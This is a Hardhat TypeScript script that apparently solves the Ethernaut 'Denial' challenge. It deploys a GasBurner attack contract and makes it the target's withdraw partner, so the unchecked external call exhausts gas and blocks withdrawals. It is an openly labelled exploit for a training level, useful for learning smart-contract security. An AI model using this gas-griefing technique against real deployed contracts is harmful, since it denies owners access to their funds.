import { ethers } from "hardhat";

const attackDenial = async () => {
    // change contract addresses here.
    const denialAddress = process.env.DENIAL!;
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below
    // Exploit comes from no check withdraw function withno mitigation from attack through execution of some unknown external contract code through call method.
    // You may read more on:
    // https://solidity-by-example.org/sending-ether/
    // https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties

    // deploying attack contract here
    // const deployed = await deployContract(hre, "GasBurner", args);
    // alternative below
    console.log("Deploying attack contract GasBurner...");
    const attack = await (await ethers.getContractFactory("GasBurner", deployer)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (gasBurner.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: gasBurner.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [{ internalType: "address", name: "_partner", type: "address" }],
            name: "setWithdrawPartner",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [],
            name: "partner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, denialAddress);
    console.log("Checking current partner");
    let partner = await contract.partner();
    console.log(`Partner is: ${partner}`);
    console.log("Now setting gasburner as withdraw partner");
    const tx1 = await contract.setWithdrawPartner(attack.address);
    console.log(tx1);
    console.log("Checking new partner");
    partner = await contract.partner();
    console.log(`Partner is: ${partner}`);
    if (partner === attack.address) {
        console.log("Partner is now gasburner...you may submit on ethernaut");
    } else {
        console.log("Please review code above and try agan...");
    }
};

attackDenial()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
